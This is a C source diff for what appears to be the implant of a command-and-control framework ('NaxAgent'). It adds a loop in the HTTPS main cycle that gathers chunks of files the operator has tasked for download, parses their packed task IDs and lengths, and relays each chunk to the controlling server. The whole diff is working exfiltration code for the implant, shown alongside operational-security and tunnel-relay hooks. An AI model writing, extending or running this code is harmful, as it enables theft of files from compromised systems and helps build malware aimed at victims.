@@ -925,6 +925,28 @@ void nax_https_main(NaxAgent *a)
 
             nax_opsec_heartbeat();
 
+            /* Relay download chunks (one chunk per active download per cycle) */
+            if (a->download_head) {
+                uint32_t cap = NAX_DL_CHUNK_MAX + 64;
+                uint8_t *dbuf = (uint8_t *)malloc(cap);
+                if (dbuf) {
+                    uint32_t total = nax_process_downloads(a, dbuf, cap);
+                    /* Parse packed entries: [taskId(4)][dataLen(4)][data] */
+                    uint32_t off = 0;
+                    while (off + 8 <= total) {
+                        uint32_t tid  = (uint32_t)dbuf[off]   | ((uint32_t)dbuf[off+1]<<8)
+                                      | ((uint32_t)dbuf[off+2]<<16) | ((uint32_t)dbuf[off+3]<<24);
+                        uint32_t dlen = (uint32_t)dbuf[off+4] | ((uint32_t)dbuf[off+5]<<8)
+                                      | ((uint32_t)dbuf[off+6]<<16) | ((uint32_t)dbuf[off+7]<<24);
+                        off += 8;
+                        if (off + dlen > total) break;
+                        https_send_result(a, tid, NAX_STATUS_OK, dbuf + off, dlen);
+                        off += dlen;
+                    }
+                    free(dbuf);
+                }
+            }
+
             /* Relay tunnels */
             {
                 uint8_t *tbuf = (uint8_t *)malloc(4 * 1024 * 1024);
